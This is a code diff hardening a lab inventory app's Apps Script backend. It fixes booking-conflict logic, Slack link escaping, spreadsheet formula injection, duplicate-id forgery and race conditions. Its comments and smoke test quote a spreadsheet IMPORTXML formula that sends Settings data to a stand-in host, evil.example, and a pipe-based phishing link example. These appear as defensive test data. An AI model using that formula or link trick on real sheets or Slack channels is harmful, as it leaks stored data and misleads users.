@@ -233,7 +233,14 @@ function overlapping_(c, ignoreId, status) {
   return readTable("Checkouts").filter(function (x) {
     if (ignoreId != null && String(x.id) === String(ignoreId)) return false;
     if (x.status !== status) return false;
-    var same = x.itemId ? String(x.itemId) === String(c.itemId) : x.item === c.item;
+    // Both sides, not just the stored one. Branching on x.itemId alone made the
+    // test one-way: a booking with no itemId matched nothing (every stored
+    // itemId is truthy and none equals ""), so it cleared every conflict and
+    // queue check and went straight to Active — while every later booking for
+    // the same item DID match it, by name, and was refused. One request seized
+    // an item permanently: it clashed with nobody and everybody clashed with it.
+    // index.html:441 has always had this right.
+    var same = (x.itemId && c.itemId) ? String(x.itemId) === String(c.itemId) : x.item === c.item;
     return same && bookingsClash_(x, c);
   });
 }
@@ -312,6 +319,19 @@ function slackEsc_(v) {
   return String(v == null ? "" : v).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
+// A URL inside Slack's <url|label> syntax ends at the first pipe, and slackEsc_ does
+// not escape one. So a purchase link of
+//   https://evil.example|Password reset required — click here
+// renders as a link whose text the requester chose, delivered to the whole lab by
+// the lab's own bot. Escaping < and > never prevented that; percent-encoding the
+// pipe does. Anything that is not plainly http(s) is not made a link at all, which
+// also disposes of javascript: and data:.
+function slackUrl_(v) {
+  var u = String(v == null ? "" : v).trim();
+  if (!/^https?:\/\//i.test(u)) return "";
+  return slackEsc_(u).replace(/\|/g, "%7C");
+}
+
 function sendSlack(emoji, title, details, fields, priority, link) {
   if (!SLACK_WEBHOOK_URL || SLACK_WEBHOOK_URL === "YOUR_SLACK_WEBHOOK_URL_HERE" || SLACK_WEBHOOK_URL === "") return;
   var mode = getSlackMode();
@@ -334,7 +354,10 @@ function sendSlack(emoji, title, details, fields, priority, link) {
     if (details) blocks.push({ type: "section", text: { type: "mrkdwn", text: slackEsc_(details) } });
     // The one place a real link is wanted. Built here, after escaping, so a URL
     // carrying a "|" cannot relabel itself.
-    if (link) blocks.push({ type: "section", text: { type: "mrkdwn", text: "<" + slackEsc_(link) + "|Purchase link>" } });
+    if (link) {
+      var safeLink = slackUrl_(link);
+      if (safeLink) blocks.push({ type: "section", text: { type: "mrkdwn", text: "<" + safeLink + "|Purchase link>" } });
+    }
     if (fields && fields.length > 0) {
       blocks.push({ type: "section", fields: fields.map(function(f) { return { type: "mrkdwn", text: slackEsc_(f) }; }) });
     }
@@ -378,12 +401,16 @@ function sortOrdersByUrgency_(list) {
 }
 
 // Format a single order line with urgency badge inline
+// Every value on this line was typed by whoever filed the order. sendSlack() escapes
+// its arguments; sendDailyDigest() assembles its own blocks and reaches this helper
+// directly, so the escaping has to happen here or it does not happen at all.
 function formatOrderLine_(o) {
   var badge = (o.urgency === "Urgent") ? "🚨 " : (o.urgency === "High") ? "⚠️ " : "";
-  var parts = [badge + "*" + o.item + "*  " + o.qty + " " + (o.unit || "")];
-  if (o.store) parts.push(o.store);
-  if (o.price) parts.push(o.price);
-  if (o.link)  parts.push("<" + o.link + "|link>");
+  var parts = [badge + "*" + slackEsc_(o.item) + "*  " + slackEsc_(o.qty) + " " + slackEsc_(o.unit || "")];
+  if (o.store) parts.push(slackEsc_(o.store));
+  if (o.price) parts.push(slackEsc_(o.price));
+  var safeLink = slackUrl_(o.link);
+  if (safeLink) parts.push("<" + safeLink + "|link>");
   return "• " + parts.join(" | ");
 }
 
@@ -442,7 +469,7 @@ function sendDailyDigest() {
   // ── Overdue checkouts ──
   if (overdues.length > 0) {
     var odText = overdues.map(function(o){
-      return "• *" + o.item + "* — " + o.user + " (due " + String(o.ret).slice(0,10) + ")";
+      return "• *" + slackEsc_(o.item) + "* — " + slackEsc_(o.user) + " (due " + slackEsc_(String(o.ret).slice(0,10)) + ")";
     }).join("\n");
     blocks.push({ type: "section", text: { type: "mrkdwn", text: "🔴 *Overdue Checkouts (" + overdues.length + ")*\n" + odText } });
   } else {
@@ -453,7 +480,7 @@ function sendDailyDigest() {
   if (lowStock.length > 0) {
     var lsText = lowStock.slice(0,6).map(function(i){
       var out = Number(i.qty) <= 0;
-      return "• *" + i.name + "* — " + i.qty + "/" + i.minQty + " " + i.unit
+      return "• *" + slackEsc_(i.name) + "* — " + slackEsc_(i.qty) + "/" + slackEsc_(i.minQty) + " " + slackEsc_(i.unit)
            + (out ? " (OUT OF STOCK)" : " (reorder needed)");
     }).join("\n");
     if (lowStock.length > 6) lsText += "\n_…and " + (lowStock.length-6) + " more_";
@@ -467,7 +494,7 @@ function sendDailyDigest() {
       var emoji = String(r.emoji).trim();
       counts[emoji] = (counts[emoji] || 0) + 1;
     });
-    var countLine = Object.keys(counts).map(function(e){ return e + " ×" + counts[e]; }).join("  ·  ");
+    var countLine = Object.keys(counts).map(function(e){ return slackEsc_(e) + " ×" + counts[e]; }).join("  ·  ");
     blocks.push({ type: "context", elements: [{ type: "mrkdwn", text: "Today's activity: " + countLine + "  (" + queuedRows.length + " total)" }] });
   }
 
@@ -973,7 +1000,7 @@ function getOrCreateSheet(name, headers) {
 // excludes qty/minQty, which are numbers, and out/ret/date/fromTime/toTime, which
 // are stored as real dates so the tabs stay sortable by a human and converted back
 // on the way out.
-var TEXT_FIELDS_ = ["name","loc","cat","desc","serial","unit","status","displayId","tags","item","store","requestedBy","reason","link","from","receivedBy","tracking","user","checkedOutByEmail","groupEmails","requestedByEmail","notes"];
+var TEXT_FIELDS_ = ["name","loc","cat","desc","serial","unit","status","displayId","tags","item","store","requestedBy","reason","link","from","receivedBy","tracking","user","checkedOutByEmail","groupEmails","requestedByEmail","notes","price","urgency"];
 
 function normalizeRow_(headers, row) {
   var pad = function (n) { return String(n).padStart(2, "0"); };
@@ -1003,10 +1030,6 @@ function normalizeRow_(headers, row) {
     if (TEXT_FIELDS_.indexOf(h) >= 0 && typeof val !== "string") {
       val = val == null ? "" : String(val);
     }
-    // Undo serializeCell_'s formula guard. Sheets normally eats the apostrophe
-    // itself, so this usually finds nothing; doing it anyway means the value the
-    // app reads is the value it wrote, whichever way the API behaves.
-    if (typeof val === "string" && val.charAt(0) === "'" && reparsed_(val.slice(1))) val = val.slice(1);
     // Datetime fields — Sheets turns "YYYY-MM-DD HH:MM" into a Date object
     if (["out", "ret"].indexOf(h) >= 0) {
       if (val instanceof Date) val = ymd(val) + " " + hm(val);
@@ -1086,33 +1109,19 @@ var FORMULA_LEAD_ = /^[=+\-@\t\r]/;
 // is eaten on the way in: "'tis a scope" would come back as "tis a scope". Writing
 // two means one survives.
 //
-// Escaping it also settles a hedge. The code both wrote the marker and stripped it
-// on the way back, which cannot both be right — and nothing here could tell which,
-// because the model sheet the tests run against has no opinion about apostrophes.
-// smokeTest() answered it on the real thing on 2026-08-20: getValues() returned
+// Everything here rests on one measured fact. The code used to both WRITE the
+// marker and STRIP it on the way back, which cannot both be right, and no test
+// could say which: a model spreadsheet has no opinion about apostrophes.
+// smokeTest() asked the real one on 2026-08-20. getValues() returned
 //   =IMPORTXML("https://evil.example/?d="&JOIN(",",Settings!A1:B99),"//a")
-// with no leading apostrophe. Sheets eats the marker. So the strip in normalizeRow_
-// never fires in production — it is kept because it costs nothing and makes the
-// round trip land on the original value under either behaviour, which is the
-// property that made this safe to change without knowing the answer first.
+// with no leading apostrophe. Sheets eats the marker and formats the cell as text.
+//
+// So there is no strip any more — writing is the whole mechanism. If Google ever
+// changed that, every text cell would come back with a visible apostrophe, which
+// smokeTest() fails on immediately. Loud is the right failure mode here; the bugs
+// this file exists to prevent were all silent ones.
 // (A value that genuinely starts with two apostrophes loses one. Noted, not fixed.)
 var NEEDS_GUARD_ = /^['=+\-@\t\r]/;
-
-// Sheets parses every string it is given, and a text field only stays the text
-// that was typed if what was typed does not look like something else. A serial
-// number "0012345678" is a number to a spreadsheet, and the leading zeros are gone
-// for good; "09:00" is a time and comes back as a Date in 1899; "TRUE" is a
-// boolean. The apostrophe that keeps formulas inert keeps these intact too.
-function reparsed_(val) {
-  if (typeof val !== "string" || val === "") return false;
-  if (NEEDS_GUARD_.test(val)) return true;                  // a formula, or our own marker
-  if (/^-?\d+(\.\d+)?$/.test(val)) return true;             // 0012345678 → 12345678
-  if (/^\d{1,2}:\d{2}(:\d{2})?$/.test(val)) return true;    // 09:00 → 1899-12-30T09:00
-  if (/^\d{4}-\d{1,2}-\d{1,2}/.test(val)) return true;      // 2026-09-01 → a Date
-  if (/^\d{1,2}\/\d{1,2}\/\d{2,4}$/.test(val)) return true; // 9/1/2026 → a Date
-  if (/^(TRUE|FALSE)$/i.test(val)) return true;             // → a boolean
-  return false;
-}
 
 // The guard on its own, for the writes that aren't record fields — the purchase
 // summary sheet and Settings. Anything that reaches a cell goes through this.
@@ -1124,9 +1133,20 @@ function guardText_(val) {
 function serializeCell_(header, val) {
   if (header === "usedBy" && Array.isArray(val)) return JSON.stringify(val);
   if (val === undefined || val === null) return "";
-  // Text fields get the wider guard; everywhere else only formulas are held back,
-  // because a date column is meant to hold a date and a qty column a number.
-  if (TEXT_FIELDS_.indexOf(header) >= 0 && reparsed_(val)) return "'" + val;
+  // A text column holds text, so say so and stop guessing.
+  //
+  // This used to enumerate what a spreadsheet would rather a string were — all
+  // digits, HH:MM, YYYY-MM-DD, TRUE — and guard only those. The enumeration was
+  // wrong: a shelf written "3-14" is a date to Sheets and came back as
+  // "Sat Mar 14 2026 00:00:00 GMT-0400", a price "$14.99" lost its dollar sign,
+  // "1E5" became 100000, "1,000" became 1000, and each of them destroyed the typed
+  // value with no way to recover it. Enumerations of that kind do not converge; the
+  // cost of missing a case is silent corruption and the cost of marking one case too
+  // many is nothing at all. So every non-empty string in a text column is marked.
+  //
+  // Numbers stay numbers and dates stay dates: qty, minQty, out, ret, date,
+  // fromTime and toTime are not text columns, so the tabs remain sortable by hand.
+  if (TEXT_FIELDS_.indexOf(header) >= 0 && typeof val === "string" && val !== "") return "'" + val;
   return guardText_(val);
 }
 
@@ -1212,22 +1232,54 @@ function readSettings() {
   return out;
 }
 
+// Settings values are all text — JSON rosters, a comma-joined category list, a
+// mode name, a formatted timestamp — and readSettings() hands the cell back with no
+// normalization at all, so whatever Sheets decided a value was is what the app gets.
+// "2026-08-20 5:42 PM" was being parsed into a Date and returned to the browser as
+// "2026-08-20T21:42:00.000Z", which is how the Backup tooltip came to show a UTC
+// timestamp nobody wrote. Marked as text, they come back as themselves.
+function settingCell_(v) {
+  if (typeof v === "string" && v !== "") return "'" + v;
+  return guardText_(v);
+}
+
 function writeSetting(key, value) {
   var sheet = getOrCreateSheet("Settings");
   var data = sheet.getDataRange().getValues();
   for (var i = 1; i < data.length; i++) {
     if (String(data[i][0]) === String(key)) {
-      sheet.getRange(i + 1, 2).setValue(guardText_(value));
+      sheet.getRange(i + 1, 2).setValue(settingCell_(value));
       return;
     }
   }
-  sheet.appendRow([guardText_(key), guardText_(value)]);
+  sheet.appendRow([settingCell_(key), settingCell_(value)]);
 }
 
 function jsonResponse(data) {
   return ContentService
     .createTextOutput(JSON.stringify(data))
     .setMimeType(ContentService.MimeType.JSON);
+}
+
+// Row ids are minted by the browser (uid() = Date.now() + a random), so the server
+// has never checked that the one it is handed is free. Every lookup goes through
+// locateRow_, which stops at the FIRST match — so a row planted with an id already
+// in the table makes an admin's next approve, edit or delete land on the legitimate
+// row instead of the planted one. An accidental collision is vanishingly unlikely;
+// a deliberate one is a single field in a request body.
+function idTaken_(table, id) {
+  if (id === "" || id == null) return false;
+  return !!findRow(table, id);
+}
+
+// Only ever called for a row that is about to be created, and only when the caller
+// did not supply a usable id.
+function freshId_(table) {
+  for (var i = 0; i < 50; i++) {
+    var id = String(new Date().getTime()) + "-" + Math.floor(Math.random() * 1e9);
+    if (!idTaken_(table, id)) return id;
+  }
+  throw new Error("Could not mint an unused id for " + table);
 }
 
 function idsMatch(sheetVal, targetId) {
@@ -1295,6 +1347,11 @@ function doPost(e) {
       // can change them afterwards. Status is not describing anything: a new item is
       // on the shelf, and In Use is derived from bookings that cannot exist yet.
       if (!admin) it.status = "Available";
+      if (idTaken_("Items", it.id)) {
+        return jsonResponse({ error: "Duplicate id",
+            detail: "Something already has that id. Reload and try again." });
+      }
+      if (!it.id) it.id = freshId_("Items");
       // Always generate displayId server-side (inside the lock) to prevent collisions.
       const allItems = readTable("Items");
       const parsed = parseDisplayId_(it.displayId);
@@ -1446,6 +1503,11 @@ function doPost(e) {
   // ── Add Delivery ──────────────────────────────────────────────────────────
   if (action === "addDelivery") {
     const d = body.delivery;
+    if (idTaken_("Deliveries", d.id)) {
+      return jsonResponse({ error: "Duplicate id",
+        detail: "Something already has that id. Reload and try again." });
+    }
+    if (!d.id) d.id = freshId_("Deliveries");
     appendRow("Deliveries", d);
     sendSlack("🚚", "Delivery Received: " + d.item, null, ["*Qty*\n" + d.qty + " " + d.unit, "*Supplier*\n" + (d.from||"—"), "*Received by*\n" + (d.receivedBy||userName), "*Tracking*\n" + (d.tracking||"—")]);
     logAudit(userName, userEmail, "AddDelivery", d.item + " × " + d.qty + " " + (d.unit||"") + " from " + (d.from||"—"));
@@ -1453,93 +1515,132 @@ function doPost(e) {
   }
 
   // ── Add Checkout ──────────────────────────────────────────────────────────
+  // Booking is a read-then-write: look for a clash, then write the row that would
+  // be one. Without the lock two requests that each saw a clear slot are both
+  // written, which is the double-booking the check exists to prevent — moving the
+  // check server-side narrowed the browser's thirty-second window, it did not close
+  // it. Approving and editing re-check the same way and race the same way, so all
+  // three take the lock. addItem and useConsumable have taken it all along.
   if (action === "addCheckout") {
-    const c = body.checkout;
+    var coLock = LockService.getScriptLock();
+    coLock.waitLock(10000);
+    try {
+      const c = body.checkout;
 
-    // The row says who is on the hook for returning it and who may edit or
-    // withdraw it, so it has to be the person who actually asked. Admins log
-    // checkouts on other people's behalf; members only ever book for themselves.
-    if (!admin) {
-      c.checkedOutByEmail = userEmail;
-      c.user = userName;
+      // The row says who is on the hook for returning it and who may edit or
+      // withdraw it, so it has to be the person who actually asked. Admins log
+      // checkouts on other people's behalf; members only ever book for themselves.
+      if (!admin) {
+        c.checkedOutByEmail = userEmail;
+        c.user = userName;
+      }
+      // Asking is not deciding: a request is written Pending or Active by
+      // waitReason_ below, never by whatever the browser put in the field.
+      c.status = "Active";
+
+      if (idTaken_("Checkouts", c.id)) {
+        return jsonResponse({ error: "Duplicate id",
+            detail: "Something already has that id. Reload and try again." });
+      }
+      if (!c.id) c.id = freshId_("Checkouts");
+
+      // Which item this is for is the server's to establish. Everything downstream —
+      // conflicts, the queue, the In Use flag — keys off itemId, and a row whose
+      // itemId names nothing is a row those rules cannot see. The name comes from
+      // the Items row, not from the request, so the two can never disagree.
+      var booked = c.itemId ? findRow("Items", c.itemId) : null;
+      if (!booked) {
+        return jsonResponse({ error: "Unknown item",
+          detail: "This booking does not name an item that exists" });
+      }
+      c.item = booked.name;
+
+      const bad = badRange_(c);
+      if (bad) return jsonResponse({ error: "Bad dates", detail: bad });
+
+      if (leadTooFar_(c)) {
+        return jsonResponse({ error: "Too far ahead",
+          detail: "Bookings can start at most " + MAX_LEAD_DAYS + " days from now" });
+      }
+
+      // Re-checked here because the browser's view of who holds what is a poll old,
+      // and two people can book the same slot inside that window.
+      const clash = bookingConflict_(c, null);
+      if (clash) return jsonResponse({ error: "Clash", detail: clash });
+
+      // Other people already queuing for the same slot. Reported, never used to
+      // refuse — the admin is the one who picks between them.
+      // ignoreId exists to stop a row clashing with itself while it is being edited
+      // or approved. Nothing is being edited here — the row does not exist yet — so
+      // there is nothing to ignore, and passing the browser's id let a member name
+      // the pending request they wanted skipped and walk past the queue rule.
+      const rivals = competing_(c, null);
+      // Long holds wait for an admin, and so does anything that would step over
+      // someone already waiting. The item stays available until then — nothing is
+      // reserved by asking, or a rejected request would quietly take it away.
+      const reason = waitReason_(c, null);
+      if (reason) c.status = CHECKOUT_PENDING;
+
+      appendRow("Checkouts", c);
+
+      if (reason) {
+        const why = reason === "long"
+          ? "Longer than " + MAX_DAYS_WITHOUT_APPROVAL + " days"
+          : "Someone is already waiting for this slot";
+        sendSlack("⏳", "Approval Needed: " + c.item, why +
+          (rivals.length ? " — " + rivals.length + " other request" + (rivals.length>1?"s":"") + " for the same slot" : ""),
+          ["*Person*\n" + c.user, "*From*\n" + (c.out||"—"), "*Until*\n" + (c.ret||"—")], "high");
+        logAudit(userName, userEmail, "CheckoutPending", c.item + " → " + c.user + " | until:" + (c.ret||"—") +
+          " | why:" + reason + (rivals.length ? " | competing:" + rivals.length : ""));
+        return jsonResponse({ ok: true, pending: true, reason: reason, competing: rivals });
+      }
+
+      // Only if it starts now. A booking for a fortnight's time is on the calendar,
+      // not off the shelf — syncItemStatuses() marks it when the day arrives.
+      if (bookingHoldsItem_(c)) updateItemStatus(c.itemId, c.item, c.user, "add");
+      sendSlack("🔑", "Item Checked Out: " + c.item, null, ["*Person*\n" + c.user, "*Date*\n" + (c.out||"—"), "*Return by*\n" + (c.ret||"—")]);
+      logAudit(userName, userEmail, "Checkout", c.item + " → " + c.user + " | return by:" + (c.ret||"—"));
+      return jsonResponse({ ok: true });
+  } finally {
+      coLock.releaseLock();
     }
-    // Asking is not deciding: a request is written Pending or Active by
-    // waitReason_ below, never by whatever the browser put in the field.
-    c.status = "Active";
-
-    const bad = badRange_(c);
-    if (bad) return jsonResponse({ error: "Bad dates", detail: bad });
-
-    if (leadTooFar_(c)) {
-      return jsonResponse({ error: "Too far ahead",
-        detail: "Bookings can start at most " + MAX_LEAD_DAYS + " days from now" });
-    }
-
-    // Re-checked here because the browser's view of who holds what is a poll old,
-    // and two people can book the same slot inside that window.
-    const clash = bookingConflict_(c, null);
-    if (clash) return jsonResponse({ error: "Clash", detail: clash });
-
-    // Other people already queuing for the same slot. Reported, never used to
-    // refuse — the admin is the one who picks between them.
-    const rivals = competing_(c, c.id);
-    // Long holds wait for an admin, and so does anything that would step over
-    // someone already waiting. The item stays available until then — nothing is
-    // reserved by asking, or a rejected request would quietly take it away.
-    const reason = waitReason_(c, c.id);
-    if (reason) c.status = CHECKOUT_PENDING;
-
-    appendRow("Checkouts", c);
-
-    if (reason) {
-      const why = reason === "long"
-        ? "Longer than " + MAX_DAYS_WITHOUT_APPROVAL + " days"
-        : "Someone is already waiting for this slot";
-      sendSlack("⏳", "Approval Needed: " + c.item, why +
-        (rivals.length ? " — " + rivals.length + " other request" + (rivals.length>1?"s":"") + " for the same slot" : ""),
-        ["*Person*\n" + c.user, "*From*\n" + (c.out||"—"), "*Until*\n" + (c.ret||"—")], "high");
-      logAudit(userName, userEmail, "CheckoutPending", c.item + " → " + c.user + " | until:" + (c.ret||"—") +
-        " | why:" + reason + (rivals.length ? " | competing:" + rivals.length : ""));
-      return jsonResponse({ ok: true, pending: true, reason: reason, competing: rivals });
-    }
-
-    // Only if it starts now. A booking for a fortnight's time is on the calendar,
-    // not off the shelf — syncItemStatuses() marks it when the day arrives.
-    if (bookingHoldsItem_(c)) updateItemStatus(c.itemId, c.item, c.user, "add");
-    sendSlack("🔑", "Item Checked Out: " + c.item, null, ["*Person*\n" + c.user, "*Date*\n" + (c.out||"—"), "*Return by*\n" + (c.ret||"—")]);
-    logAudit(userName, userEmail, "Checkout", c.item + " → " + c.user + " | return by:" + (c.ret||"—"));
-    return jsonResponse({ ok: true });
   }
 
   // ── Approve / reject a long checkout (admin only) ─────────────────────────
   if (action === "decideCheckout") {
-    if (!admin) return jsonResponse({ error: "Forbidden", detail: "Only admins can approve checkouts" });
-    const co = findRow("Checkouts", body.checkoutId);
-    if (!co) return jsonResponse({ error: "Checkout not found" });
-    if (co.status !== CHECKOUT_PENDING) return jsonResponse({ error: "Not pending", detail: "This request is already " + co.status });
+    var decLock = LockService.getScriptLock();
+    decLock.waitLock(10000);
+    try {
+      if (!admin) return jsonResponse({ error: "Forbidden", detail: "Only admins can approve checkouts" });
+      const co = findRow("Checkouts", body.checkoutId);
+      if (!co) return jsonResponse({ error: "Checkout not found" });
+      if (co.status !== CHECKOUT_PENDING) return jsonResponse({ error: "Not pending", detail: "This request is already " + co.status });
 
-    if (body.approve) {
-      // Nothing was reserved while this waited, so the slot may be gone. Approving
-      // blindly would hand the same item to two people.
-      // The one honest question: is anything Active over these dates? Since rule 2
-      // covers sole-use items too, that is the whole test. There used to be a second
-      // one here — refuse if the item is flagged In Use — which made sense while In
-      // Use was the only thing keeping a sole-use item exclusive. It no longer is,
-      // and In Use now means "somebody has it right now", so that test had come to
-      // read "refuse every future request for anything currently out": exactly the
-      // behaviour we set out to kill.
-      const gone = bookingConflict_(co, co.id);
-      if (gone) return jsonResponse({ error: "Clash", detail: "Taken while this was waiting \u2014 " + gone });
-      updateRow("Checkouts", body.checkoutId, { status: "Active" });
-      if (bookingHoldsItem_(co)) updateItemStatus(co.itemId, co.item, co.user, "add");
-      sendSlack("✅", "Long Checkout Approved: " + co.item, null, ["*Person*\n" + co.user, "*Until*\n" + (co.ret||"—"), "*By*\n" + userName]);
-      logAudit(userName, userEmail, "CheckoutApproved", co.item + " → " + co.user);
-    } else {
-      updateRow("Checkouts", body.checkoutId, { status: "Rejected" });
-      sendSlack("🚫", "Long Checkout Rejected: " + co.item, null, ["*Person*\n" + co.user, "*By*\n" + userName], "high");
-      logAudit(userName, userEmail, "CheckoutRejected", co.item + " → " + co.user);
+      if (body.approve) {
+        // Nothing was reserved while this waited, so the slot may be gone. Approving
+        // blindly would hand the same item to two people.
+        // The one honest question: is anything Active over these dates? Since rule 2
+        // covers sole-use items too, that is the whole test. There used to be a second
+        // one here — refuse if the item is flagged In Use — which made sense while In
+        // Use was the only thing keeping a sole-use item exclusive. It no longer is,
+        // and In Use now means "somebody has it right now", so that test had come to
+        // read "refuse every future request for anything currently out": exactly the
+        // behaviour we set out to kill.
+        const gone = bookingConflict_(co, co.id);
+        if (gone) return jsonResponse({ error: "Clash", detail: "Taken while this was waiting \u2014 " + gone });
+        updateRow("Checkouts", body.checkoutId, { status: "Active" });
+        if (bookingHoldsItem_(co)) updateItemStatus(co.itemId, co.item, co.user, "add");
+        sendSlack("✅", "Long Checkout Approved: " + co.item, null, ["*Person*\n" + co.user, "*Until*\n" + (co.ret||"—"), "*By*\n" + userName]);
+        logAudit(userName, userEmail, "CheckoutApproved", co.item + " → " + co.user);
+      } else {
+        updateRow("Checkouts", body.checkoutId, { status: "Rejected" });
+        sendSlack("🚫", "Long Checkout Rejected: " + co.item, null, ["*Person*\n" + co.user, "*By*\n" + userName], "high");
+        logAudit(userName, userEmail, "CheckoutRejected", co.item + " → " + co.user);
+      }
+      return jsonResponse({ ok: true });
+  } finally {
+      decLock.releaseLock();
     }
-    return jsonResponse({ ok: true });
   }
 
   // ── Edit a request that is still waiting ─────────────────────────────────
@@ -1547,50 +1648,56 @@ function doPost(e) {
   // with someone else's. Making you cancel and retype the whole thing to move it
   // by two hours would be silly.
   if (action === "updateCheckout") {
-    const co = findRow("Checkouts", body.checkoutId);
-    if (!co) return jsonResponse({ error: "Checkout not found" });
-    if (co.status !== CHECKOUT_PENDING) {
-      return jsonResponse({ error: "Not pending", detail: "Only a request still waiting for approval can be edited — this one is " + co.status });
+    var editLock = LockService.getScriptLock();
+    editLock.waitLock(10000);
+    try {
+      const co = findRow("Checkouts", body.checkoutId);
+      if (!co) return jsonResponse({ error: "Checkout not found" });
+      if (co.status !== CHECKOUT_PENDING) {
+        return jsonResponse({ error: "Not pending", detail: "Only a request still waiting for approval can be edited — this one is " + co.status });
+      }
+      const coEmail = String(co.checkedOutByEmail || "").trim().toLowerCase();
+      if (!admin && coEmail && userEmail !== coEmail) {
+        return jsonResponse({ error: "Forbidden", detail: "Only the person who asked for this, or an admin, can change it" });
+      }
+
+      // Whitelisted: everything a requester is allowed to move. Taking body.checkout
+      // wholesale would let a member patch status:"Active" and approve themselves.
+      const patch = {};
+      ["out", "ret", "fromTime", "toTime", "groupEmails"].forEach(function (k) {
+        if (body.checkout && body.checkout[k] !== undefined) patch[k] = body.checkout[k];
+      });
+      const merged = Object.assign({}, co, patch);
+
+      const badEdit = badRange_(merged);
+      if (badEdit) return jsonResponse({ error: "Bad dates", detail: badEdit });
+
+      if (leadTooFar_(merged)) {
+        return jsonResponse({ error: "Too far ahead",
+          detail: "Bookings can start at most " + MAX_LEAD_DAYS + " days from now" });
+      }
+      const blocked = bookingConflict_(merged, co.id);
+      if (blocked) return jsonResponse({ error: "Clash", detail: blocked });
+
+      // Editing re-runs the same rules. Shorten it under the limit AND off everyone
+      // else's slot, and the reason it needed an admin is gone, so it just becomes
+      // a checkout. Still overlapping someone who is waiting keeps it in the queue.
+      const reason = waitReason_(merged, co.id);
+      const stillPending = !!reason;
+      patch.status = stillPending ? CHECKOUT_PENDING : "Active";
+      updateRow("Checkouts", co.id, patch);
+
+      if (!stillPending) {
+        if (bookingHoldsItem_(merged)) updateItemStatus(co.itemId, co.item, co.user, "add");
+        sendSlack("🔑", "Request Shortened — Now Active: " + co.item, "No longer needs approval",
+          ["*Person*\n" + co.user, "*From*\n" + (merged.out||"—"), "*Return by*\n" + (merged.ret||"—")]);
+      }
+      logAudit(userName, userEmail, "CheckoutEdited", co.item + " → " + co.user +
+        " | " + (merged.out||"—") + " to " + (merged.ret||"—") + " | " + patch.status);
+      return jsonResponse({ ok: true, pending: stillPending, reason: reason, competing: stillPending ? competing_(merged, co.id) : [] });
+  } finally {
+      editLock.releaseLock();
     }
-    const coEmail = String(co.checkedOutByEmail || "").trim().toLowerCase();
-    if (!admin && coEmail && userEmail !== coEmail) {
-      return jsonResponse({ error: "Forbidden", detail: "Only the person who asked for this, or an admin, can change it" });
-    }
-
-    // Whitelisted: everything a requester is allowed to move. Taking body.checkout
-    // wholesale would let a member patch status:"Active" and approve themselves.
-    const patch = {};
-    ["out", "ret", "fromTime", "toTime", "groupEmails"].forEach(function (k) {
-      if (body.checkout && body.checkout[k] !== undefined) patch[k] = body.checkout[k];
-    });
-    const merged = Object.assign({}, co, patch);
-
-    const badEdit = badRange_(merged);
-    if (badEdit) return jsonResponse({ error: "Bad dates", detail: badEdit });
-
-    if (leadTooFar_(merged)) {
-      return jsonResponse({ error: "Too far ahead",
-        detail: "Bookings can start at most " + MAX_LEAD_DAYS + " days from now" });
-    }
-    const blocked = bookingConflict_(merged, co.id);
-    if (blocked) return jsonResponse({ error: "Clash", detail: blocked });
-
-    // Editing re-runs the same rules. Shorten it under the limit AND off everyone
-    // else's slot, and the reason it needed an admin is gone, so it just becomes
-    // a checkout. Still overlapping someone who is waiting keeps it in the queue.
-    const reason = waitReason_(merged, co.id);
-    const stillPending = !!reason;
-    patch.status = stillPending ? CHECKOUT_PENDING : "Active";
-    updateRow("Checkouts", co.id, patch);
-
-    if (!stillPending) {
-      if (bookingHoldsItem_(merged)) updateItemStatus(co.itemId, co.item, co.user, "add");
-      sendSlack("🔑", "Request Shortened — Now Active: " + co.item, "No longer needs approval",
-        ["*Person*\n" + co.user, "*From*\n" + (merged.out||"—"), "*Return by*\n" + (merged.ret||"—")]);
-    }
-    logAudit(userName, userEmail, "CheckoutEdited", co.item + " → " + co.user +
-      " | " + (merged.out||"—") + " to " + (merged.ret||"—") + " | " + patch.status);
-    return jsonResponse({ ok: true, pending: stillPending, reason: reason, competing: stillPending ? competing_(merged, co.id) : [] });
   }
 
   // ── Withdraw your own request ─────────────────────────────────────────────
@@ -1650,6 +1757,11 @@ function doPost(e) {
   // ── Add Order ─────────────────────────────────────────────────────────────
   if (action === "addOrder") {
     const o = body.order;
+    if (idTaken_("Orders", o.id)) {
+      return jsonResponse({ error: "Duplicate id",
+        detail: "Something already has that id. Reload and try again." });
+    }
+    if (!o.id) o.id = freshId_("Orders");
     // Purchasing approval is the admin's, so a request cannot be born approved and
     // the requester cannot be someone else. Only updateOrderStatus moves it on.
     if (!admin) {
@@ -1952,10 +2064,10 @@ function updateItemStatus(itemId, itemName, userName, mode) {
 // undoes it, and this is the only place that claim is checked against the real
 // thing rather than against a model of it.
 //
-// It writes rows whose ids begin with ZZSMOKE and deletes them again, including
-// when an assertion fails. It never touches Settings, never writes to AuditLog,
-// DeleteLog or Slack, and never changes a row it did not create. Running it on a
-// sheet that already holds real inventory is safe.
+// It writes rows whose ids begin with ZZSMOKE — plus one Settings key of the same
+// name — and deletes them again, including when an assertion fails. It never writes
+// to AuditLog, DeleteLog or Slack, and never changes a row it did not create.
+// Running it on a sheet that already holds real inventory is safe.
 var SMOKE_ = "ZZSMOKE";
 
 function smokePurge_() {
@@ -1966,6 +2078,10 @@ function smokePurge_() {
       if (!deleteRow(tables[t], mine)) break;
       n++;
     }
+  }
+  for (var g2 = 0; g2 < 5; g2++) {
+    if (!deleteRow("Settings", function (r) { return String(r.key).indexOf(SMOKE_) === 0; })) break;
+    n++;
   }
   return n;
 }
@@ -1993,7 +2109,8 @@ function smokeTest() {
     appendRow("Items", {
       id: SMOKE_ + "-0012",          // leading zero — must not come back as 12
       name: EVIL,                    // formula-shaped — must stay inert text
-      cat: "Sensors & Vision", qty: 5, unit: "pcs", loc: "Hackerman 123",
+      // "3-14" is bay 3 shelf 14 to a person and 14 March to a spreadsheet.
+      cat: "Sensors & Vision", qty: 5, unit: "pcs", loc: "3-14",
       minQty: 2, img: "", desc: "'tis a smoke test",   // leading apostrophe
       status: "Available",
       usedBy: ["Alice", "Bob"],      // array — must survive as an array
@@ -2009,6 +2126,7 @@ function smokeTest() {
       ok("formula-shaped name stays text",   it.name === EVIL, it.name);
       ok("the formula did not evaluate",     typeof rawName === "string" && rawName.indexOf("IMPORTXML") > 0, rawName);
       ok("leading apostrophe survives",      it.desc === "'tis a smoke test", it.desc);
+      ok("a shelf written 3-14 is not March", it.loc === "3-14", it.loc);
       ok("qty is a number",                  it.qty === 5, it.qty);
       ok("minQty is a number",               it.minQty === 2, it.minQty);
